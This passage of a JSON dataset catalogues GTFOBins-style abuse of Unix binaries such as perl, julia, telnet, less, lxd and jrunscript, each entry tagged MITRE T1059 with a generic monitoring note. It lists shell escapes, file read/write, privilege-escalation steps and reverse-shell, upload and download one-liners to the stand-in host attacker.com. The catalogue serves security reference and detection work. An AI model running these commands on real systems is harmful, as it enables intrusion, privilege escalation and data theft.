                    "url": "https://gtfobins.github.io/gtfobins/run-mailcap/"
                }
            ]
        },
        {
            "name": "xpad",
            "description": "Unix binary xpad.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "xpad -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xpad usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xpad/"
                }
            ]
        },
        {
            "name": "tcsh",
            "description": "Unix binary tcsh.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "tcsh -c 'echo DATA >/path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "tcsh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tcsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tcsh/"
                }
            ]
        },
        {
            "name": "stdbuf",
            "description": "Unix binary stdbuf.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "stdbuf -i0 /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor stdbuf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/stdbuf/"
                }
            ]
        },
        {
            "name": "iconv",
            "description": "Unix binary iconv.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "iconv -f 8859_1 -t 8859_1 /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor iconv usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/iconv/"
                }
            ]
        },
        {
            "name": "fzf",
            "description": "Unix binary fzf.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "fzf --listen=12345"
                },
                {
                    "label": "SHELL: ",
                    "code": "fzf --bind 'enter:execute(/bin/sh)'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fzf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fzf/"
                }
            ]
        },
        {
            "name": "su",
            "description": "Unix binary su.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "su -c /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor su usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/su/"
                }
            ]
        },
        {
            "name": "zypper",
            "description": "Unix binary zypper.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "cp /bin/sh /usr/lib/zypper/commands/zypper-x\nzypper x"
                },
                {
                    "label": "SHELL: ",
                    "code": "cp /bin/sh /path/to/temp-dir/zypper-x\nPATH=$PATH:/path/to/temp-dir/ zypper x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zypper usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zypper/"
                }
            ]
        },
        {
            "name": "snap",
            "description": "Unix binary snap.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "snap install xxxx_1.0_all.snap --dangerous --devmode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor snap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/snap/"
                }
            ]
        },
        {
            "name": "ash",
            "description": "Unix binary ash.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "ash -c 'echo DATA >/path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "ash"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ash usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ash/"
                }
            ]
        },
        {
            "name": "telnet",
            "description": "Unix binary telnet.",
            "categories": [
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "mkfifo /path/to/temp-socket\ntelnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket"
                },
                {
                    "label": "SHELL: ",
                    "code": "telnet\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor telnet usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/telnet/"
                }
            ]
        },
        {
            "name": "aws",
            "description": "Unix binary aws.",
            "categories": [
                "file-read",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "aws ec2 describe-instances --filter file:///path/to/input-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "aws help"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor aws usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/aws/"
                }
            ]
        },
        {
            "name": "julia",
            "description": "Unix binary julia.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "julia -e 'download(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "julia -e 'print(open(f->read(f, String), \"/path/to/input-file\"))'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "julia -e 'open(f->write(f, \"DATA\"), /path/to/output-file, \"w\")'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "julia -e 'using Sockets; sock=connect(\"attacker.com\", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"
                },
                {
                    "label": "SHELL: ",
                    "code": "julia -e 'run(`/bin/sh`)'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor julia usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/julia/"
                }
            ]
        },
        {
            "name": "perl",
            "description": "Unix binary perl.",
            "categories": [
                "execute",
                "file-read",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"attacker.com\",PeerPort=>80,Proto=>\"tcp\") or die; print $s \"GET /path/to/input-file HTTP/1.1\\r\\nHost: attacker.com\\r\\nMetadata: true\\r\\nConnection: close\\r\\n\\r\\n\"; open(my $fh, \">\", \"/path/to/output-file\") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq \"\\r\\n\") { $in_content = 1; } } close($s); close($fh);'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "perl -ne print /path/to/input-file"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "perl -e 'use Socket;$i=\"attacker.com\";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
                },
                {
                    "label": "SHELL: ",
                    "code": "perl -e 'exec \"/bin/sh\"'"
                },
                {
                    "label": "SHELL: ",
                    "code": "PERL5OPT=-d PERL5DB='exec \"/bin/sh\"' perl /dev/null"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>\"attacker.com\", PeerPort=>80, Proto=>\"tcp\") or die;open(my $file, \"<\", \"/path/to/input-file\") or die;$content = join(\"\", <$file>);close($file);$headers = \"POST / HTTP/1.1\\r\\nHost: attacker.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \" . length($content) . \"\\r\\nConnection: close\\r\\n\\r\\n\";print $s $headers . $content;while (<$s>) { }close($s);'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor perl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/perl/"
                }
            ]
        },
        {
            "name": "efax",
            "description": "Unix binary efax.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "efax -d /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor efax usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/efax/"
                }
            ]
        },
        {
            "name": "strace",
            "description": "Unix binary strace.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "strace -s 999 -o /path/to/output-file strace - DATA"
                },
                {
                    "label": "SHELL: ",
                    "code": "strace -o /dev/null /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor strace usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/strace/"
                }
            ]
        },
        {
            "name": "lxd",
            "description": "Unix binary lxd.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lxd usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lxd/"
                }
            ]
        },
        {
            "name": "openvt",
            "description": "Unix binary openvt.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "openvt -- /path/to/command"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor openvt usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/openvt/"
                }
            ]
        },
        {
            "name": "dstat",
            "description": "Unix binary dstat.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "dstat --xxx"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dstat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dstat/"
                }
            ]
        },
        {
            "name": "pdb",
            "description": "Unix binary pdb.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >/path/to/temp-file\npdb /path/to/temp-file\ncont"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pdb usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pdb/"
                }
            ]
        },
        {
            "name": "dmesg",
            "description": "Unix binary dmesg.",
            "categories": [
                "file-read",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dmesg -rF /path/to/input-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "dmesg -H"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dmesg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dmesg/"
                }
            ]
        },
        {
            "name": "varnishncsa",
            "description": "Unix binary varnishncsa.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor varnishncsa usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/varnishncsa/"
                }
            ]
        },
        {
            "name": "ed",
            "description": "Unix binary ed.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ed /path/to/input-file\n,p\nq"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "ed /path/to/output-file\na\nDATA\n.\nw\nq"
                },
                {
                    "label": "SHELL: ",
                    "code": "ed\n!/bin/sh\nq"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ed usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ed/"
                }
            ]
        },
        {
            "name": "csh",
            "description": "Unix binary csh.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "csh -c 'echo DATA >/path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "csh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor csh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/csh/"
                }
            ]
        },
        {
            "name": "chown",
            "description": "Unix binary chown.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "chown $(id -un):$(id -gn) /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor chown usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/chown/"
                }
            ]
        },
        {
            "name": "xargs",
            "description": "Unix binary xargs.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "xargs -a /path/to/input-file -0"
                },
                {
                    "label": "SHELL: ",
                    "code": "xargs -a /dev/null /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "xargs -a /dev/null /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo x | xargs -o -a /dev/null /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xargs usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xargs/"
                }
            ]
        },
        {
            "name": "less",
            "description": "Unix binary less.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "cp /path/to/command ~/.lessfilter\nless /etc/hosts"
                },
                {
                    "label": "COMMAND: ",
                    "code": "LESSOPEN='/path/to/command # %s' less /etc/hosts"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "less /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "less /etc/hosts\n:e /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | less\ns/path/to/output-file\nq"
                },
                {
                    "label": "INHERIT: ",
                    "code": "less /etc/hosts\nv"
                },
                {
                    "label": "SHELL: ",
                    "code": "less /etc/hosts\n!/bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset"
                },
                {
                    "label": "SHELL: ",
                    "code": "VISUAL='/bin/sh -s --' less /etc/hosts\nv"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor less usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/less/"
                }
            ]
        },
        {
            "name": "cancel",
            "description": "Unix binary cancel.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "UPLOAD: ",
                    "code": "cancel -h attacker.com:12345 -u DATA"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cancel usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cancel/"
                }
            ]
        },
        {
            "name": "links",
            "description": "Unix binary links.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "links /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor links usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/links/"
                }
            ]
        },
        {
            "name": "rsyslogd",
            "description": "Unix binary rsyslogd.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "cat >/path/to/temp-file <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/path/to/command\nEOF\n\nrsyslogd -f /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rsyslogd usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rsyslogd/"
                }
            ]
        },
        {
            "name": "cowsay",
            "description": "Unix binary cowsay.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "cowsay -f /path/to/script.pl x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cowsay usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cowsay/"
                }
            ]
        },
        {
            "name": "nm",
            "description": "Unix binary nm.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nm /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nm usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nm/"
                }
            ]
        },
        {
            "name": "dialog",
            "description": "Unix binary dialog.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dialog --textbox /path/to/input-file 0 0"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dialog usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dialog/"
                }
            ]
        },
        {
            "name": "lwp-request",
            "description": "Unix binary lwp-request.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "lwp-request file:///path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lwp-request usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lwp-request/"
                }
            ]
        },
        {
            "name": "lftp",
            "description": "Unix binary lftp.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "lftp -c '!/bin/sh'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lftp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lftp/"
                }
            ]
        },
        {
            "name": "gimp",
            "description": "Unix binary gimp.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "gimp -idf --batch-interpreter=python-fu-eval -b '...'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gimp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gimp/"
                }
            ]
        },
        {
            "name": "xdotool",
            "description": "Unix binary xdotool.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "xdotool exec --sync /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xdotool usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xdotool/"
                }
            ]
        },
        {
            "name": "wg-quick",
            "description": "Unix binary wg-quick.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "cat >/path/to/temp-file.conf <<EOF\n[Interface]\nPostUp = /bin/sh\nEOF\n\nwg-quick up /path/to/temp-file.conf"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor wg-quick usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/wg-quick/"
                }
            ]
        },
        {
            "name": "pexec",
            "description": "Unix binary pexec.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "pexec /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pexec usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pexec/"
                }
            ]
        },
        {
            "name": "dhclient",
            "description": "Unix binary dhclient.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "dhclient -sf /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dhclient usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dhclient/"
                }
            ]
        },
        {
            "name": "genie",
            "description": "Unix binary genie.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "genie -c '/bin/sh'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor genie usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/genie/"
                }
            ]
        },
        {
            "name": "jrunscript",
            "description": "Unix binary jrunscript.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "jrunscript -e 'cp(\"http://attacker.com/path/to/input-file\",\"/path/to/output-file\")'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"/path/to/input-file\"));\n    while ((line = br.readLine()) != null) { print(line); }'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "jrunscript -e 'var fw=new java.io.FileWriter(\"/path/to/output-file\");\n    fw.write(\"DATA\");\n    fw.close();'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "jrunscript -e 'var host=\"attacker.com\";\n    var port=12345;\n    var p=new java.lang.ProcessBuilder(\"/bin/sh\", \"-i\").redirectErrorStream(true).start();\n    var s=new java.net.Socket(host,port);\n    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){\n    while(pi.available()>0)so.write(pi.read());\n    while(pe.available()>0)so.write(pe.read());\n    while(si.available()>0)po.write(si.read());\n    so.flush();po.flush();\n    java.lang.Thread.sleep(50);\n    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'"
                },
                {
                    "label": "SHELL: ",
                    "code": "jrunscript -e 'exec(\"/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor jrunscript usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/jrunscript/"
                }
            ]
        },
        {
            "name": "column",
            "description": "Unix binary column.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "column /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor column usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/column/"
                }
            ]
        },
        {
            "name": "start-stop-daemon",
            "description": "Unix binary start-stop-daemon.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "start-stop-daemon -S -x /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor start-stop-daemon usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/start-stop-daemon/"
                }
            ]
        },
        {
            "name": "easyrsa",
            "description": "Unix binary easyrsa.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file\neasyrsa --vars=/path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor easyrsa usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/easyrsa/"
                }
            ]
        },
        {
            "name": "dash",
            "description": "Unix binary dash.",
            "categories": [
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "dash -c 'echo DATA >/path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "dash"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
